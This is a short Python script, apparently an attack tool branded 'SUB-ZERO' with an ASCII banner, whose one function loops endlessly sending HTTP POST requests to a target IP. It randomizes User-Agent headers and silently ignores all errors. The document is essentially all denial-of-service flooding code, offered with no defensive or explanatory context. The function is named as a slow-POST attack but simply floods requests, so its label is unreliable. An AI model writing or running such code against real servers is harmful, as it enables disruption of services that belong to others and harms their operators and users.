import requests
import random
import time
'''
        ███████╗██╗   ██╗██████╗      ███████╗███████╗██████╗  ██████╗     
        ██╔════╝██║   ██║██╔══██╗     ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    
        ███████╗██║   ██║██████╔╝█████╗ ███╔╝ █████╗  ██████╔╝██║   ██║    
        ╚════██║██║   ██║██╔══██╗╚════╝███╔╝  ██╔══╝  ██╔══██╗██║   ██║    
        ███████║╚██████╔╝██████╔╝     ███████╗███████╗██║  ██║╚██████╔╝    
        ╚══════╝ ╚═════╝ ╚═════╝      ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     
                                                                           

                                                                                  
'''

def slow_http_post(target_ip):
    while True:
        try:
            headers = {
                "User-Agent": random.choice(["Mozilla/5.0", "Chrome/91.0", "Safari/537.36"]),
                "Content-Length": "0"
            }
            session = requests.Session()
            session.post(f"http://{target_ip}/", headers=headers, data="")
            time.sleep(0.1)
        except:
            pass
